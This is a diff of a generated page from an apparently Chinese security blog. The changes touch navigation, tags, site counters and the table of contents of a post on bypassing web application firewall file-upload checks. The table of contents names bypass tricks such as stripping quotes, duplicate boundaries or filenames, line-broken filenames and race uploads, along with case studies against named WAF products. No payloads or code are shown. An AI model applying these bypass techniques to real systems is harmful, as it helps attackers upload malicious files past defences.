 </ol>
 <p>这只是我的个人想法，如果有更好的想法，欢迎交流讨论。</p>
-<h1 id="7-Reference"><a href="#7-Reference" class="headerlink" title="7.Reference"></a>7.Reference</h1><ul>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
 <li><p><a href="http://weibo.com/ttarticle/p/show?id=2309404007261092631700&infeed=1" target="_blank" rel="noopener">WAF攻防研究之四个层次Bypass WAF</a></p>
 </li>
 <li><p><a href="https://github.com/agentzh/lua-resty-multipart-parser/blob/master/lib/resty/multipart/parser.lua" target="_blank" rel="noopener">lua-resty-multipart-parser</a></p>
@@ -542,10 +557,18 @@
       </div>
 
     <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/文件上传/" rel="tag"><i class="fa fa-tag"></i># 文件上传</a>
+          
+            <a href="/tags/bypass/" rel="tag"><i class="fa fa-tag"></i># bypass</a>
+          
+        </div>
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
-              <a href="/2019/01/13/2019-1-13-dnslog/" rel="next" title="dnslog">
-                <i class="fa fa-chevron-left"></i> dnslog
+              <a href="/2019/01/13/2019-1-13-命令执行/" rel="next" title="命令执行漏洞进阶详解">
+                <i class="fa fa-chevron-left"></i> 命令执行漏洞进阶详解
               </a>
             
           </div>
@@ -553,8 +576,8 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-              <a href="/2019/01/13/2019-1-13-命令执行/" rel="prev" title="命令执行漏洞进阶详解">
-                命令执行漏洞进阶详解 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/01/13/2019-1-13-dnslog/" rel="prev" title="dnslog">
+                dnslog <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -614,8 +637,25 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-count">124</span>
           <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
         </a>
       </div>
     
@@ -747,7 +787,9 @@
         
           
         
-        <span class="site-state-item-count">59</span>
+          
+        
+        <span class="site-state-item-count">60</span>
         <span class="site-state-item-name">标签</span>
         </a>
       </div>
@@ -824,7 +866,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-前言"><span class="nav-number">1.</span> <span class="nav-text">1. 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-文件上传的特征"><span class="nav-number">2.</span> <span class="nav-text">2. 文件上传的特征</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-WAF如何拦截"><span class="nav-number">3.</span> <span class="nav-text">3. WAF如何拦截</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-绕过"><span class="nav-number">4.</span> <span class="nav-text">4. 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1-去掉引号"><span class="nav-number">4.1.</span> <span class="nav-text">4.1 去掉引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2-双引号变成单引号"><span class="nav-number">4.2.</span> <span class="nav-text">4.2 双引号变成单引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-3-大小写"><span class="nav-number">4.3.</span> <span class="nav-text">4.3 大小写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-4-空格"><span class="nav-number">4.4.</span> <span class="nav-text">4.4 空格</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-5-去掉或修改Content-Disposition值"><span class="nav-number">4.5.</span> <span class="nav-text">4.5 去掉或修改Content-Disposition值</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-6-交换name和filename的顺序"><span class="nav-number">4.6.</span> <span class="nav-text">4.6 交换name和filename的顺序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-7-多个boundary"><span class="nav-number">4.7.</span> <span class="nav-text">4.7 多个boundary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-8-多个filename"><span class="nav-number">4.8.</span> <span class="nav-text">4.8 多个filename</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-9-多个分号"><span class="nav-number">4.9.</span> <span class="nav-text">4.9 多个分号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-10-multipart-form-DATA"><span class="nav-number">4.10.</span> <span class="nav-text">4.10 multipart/form-DATA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-11-Header在boundary前添加任意字符"><span class="nav-number">4.11.</span> <span class="nav-text">4.11 Header在boundary前添加任意字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-12-filename换行"><span class="nav-number">4.12.</span> <span class="nav-text">4.12 filename换行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-13-name和filename添加任意字符串"><span class="nav-number">4.13.</span> <span class="nav-text">4.13 name和filename添加任意字符串</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-14-其他"><span class="nav-number">4.14.</span> <span class="nav-text">4.14 其他</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-案例绕过"><span class="nav-number">5.</span> <span class="nav-text">5. 案例绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-某盾"><span class="nav-number">5.0.1.</span> <span class="nav-text">5.1 某盾</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-UCloud"><span class="nav-number">5.0.2.</span> <span class="nav-text">5.2 UCloud</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-竞争上传"><span class="nav-number">5.0.3.</span> <span class="nav-text">5.3 竞争上传</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6-How-to-Play"><span class="nav-number">6.</span> <span class="nav-text">6.How to Play</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#7-Reference"><span class="nav-number">7.</span> <span class="nav-text">7.Reference</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传的特征"><span class="nav-number">2.</span> <span class="nav-text">文件上传的特征</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WAF如何拦截"><span class="nav-number">3.</span> <span class="nav-text">WAF如何拦截</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过"><span class="nav-number">4.</span> <span class="nav-text">绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#去掉引号"><span class="nav-number">4.1.</span> <span class="nav-text">去掉引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#双引号变成单引号"><span class="nav-number">4.2.</span> <span class="nav-text">双引号变成单引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#大小写"><span class="nav-number">4.3.</span> <span class="nav-text">大小写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#空格"><span class="nav-number">4.4.</span> <span class="nav-text">空格</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#去掉或修改Content-Disposition值"><span class="nav-number">4.5.</span> <span class="nav-text">去掉或修改Content-Disposition值</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#交换name和filename的顺序"><span class="nav-number">4.6.</span> <span class="nav-text">交换name和filename的顺序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#多个boundary"><span class="nav-number">4.7.</span> <span class="nav-text">多个boundary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#多个filename"><span class="nav-number">4.8.</span> <span class="nav-text">多个filename</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#多个分号"><span class="nav-number">4.9.</span> <span class="nav-text">多个分号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#multipart-form-DATA"><span class="nav-number">4.10.</span> <span class="nav-text">multipart/form-DATA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Header在boundary前添加任意字符"><span class="nav-number">4.11.</span> <span class="nav-text">Header在boundary前添加任意字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#filename换行"><span class="nav-number">4.12.</span> <span class="nav-text">filename换行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#name和filename添加任意字符串"><span class="nav-number">4.13.</span> <span class="nav-text">name和filename添加任意字符串</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他"><span class="nav-number">4.14.</span> <span class="nav-text">其他</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#案例绕过"><span class="nav-number">5.</span> <span class="nav-text">案例绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#某盾"><span class="nav-number">5.0.1.</span> <span class="nav-text">某盾</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UCloud"><span class="nav-number">5.0.2.</span> <span class="nav-text">UCloud</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#竞争上传"><span class="nav-number">5.0.3.</span> <span class="nav-text">竞争上传</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#How-to-Play"><span class="nav-number">6.</span> <span class="nav-text">How to Play</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">7.</span> <span class="nav-text">Reference</span></a></li></ol></div>
             
 
           </div>
@@ -858,12 +900,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="站点总字数">1.4m</span>
+    <span title="站点总字数">1.5m</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">21:52</span>
+    <span title="站点阅读时长">22:21</span>
 </div>
 
 <div>
